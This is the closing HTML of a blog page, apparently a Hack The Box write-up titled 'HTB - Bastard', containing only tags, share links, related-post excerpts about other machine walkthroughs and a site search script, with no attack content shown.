</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-write-ups/'>CTF Write-ups</a>, <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >OSCP Prep</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/drupal/" class="post-tag no-text-decoration" >Drupal</a> <a href="/tags/php/" class="post-tag no-text-decoration" >PHP</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >PowerShell</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB - Bastard - QTranspose&url=https://qtranspose.xyz/posts/htb-bastard/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB - Bastard - QTranspose&u=https://qtranspose.xyz/posts/htb-bastard/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB - Bastard - QTranspose&url=https://qtranspose.xyz/posts/htb-bastard/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-time/">HTB - Time</a><li><a href="/posts/htb-bankrobber/">HTB - Bankrobber</a><li><a href="/posts/htb-bounty/">HTB - Bounty</a><li><a href="/posts/htb-forest/">HTB - Forest</a><li><a href="/posts/htb-optimum/">HTB - Optimum</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/ssrf/">SSRF</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-optimum/"><div class="card-body"> <span class="timeago small" > Nov 16, 2020 <i class="unloaded">2020-11-16T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Optimum</h3><div class="text-muted small"><p> Optimum is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-arctic/"><div class="card-body"> <span class="timeago small" > Dec 3, 2020 <i class="unloaded">2020-12-03T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Arctic</h3><div class="text-muted small"><p> Arctic is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, w...</p></div></div></a></div><div class="card"> <a href="/posts/htb-bounty/"><div class="card-body"> <span class="timeago small" > Feb 6 <i class="unloaded">2021-02-06T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Bounty</h3><div class="text-muted small"><p> Bounty is a vulnerable virtual machine created by mrb3n on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-optimum/" class="btn btn-outline-primary" prompt="Older"><p>HTB - Optimum</p></a> <a href="/posts/htb-arctic/" class="btn btn-outline-primary" prompt="Newer"><p>HTB - Arctic</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"></div><div class="footer-right"><p class="mb-0"> © 2021 <a href="https://github.com/QTranspose">QTranspose</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/ssrf/">SSRF</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://qtranspose.xyz{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
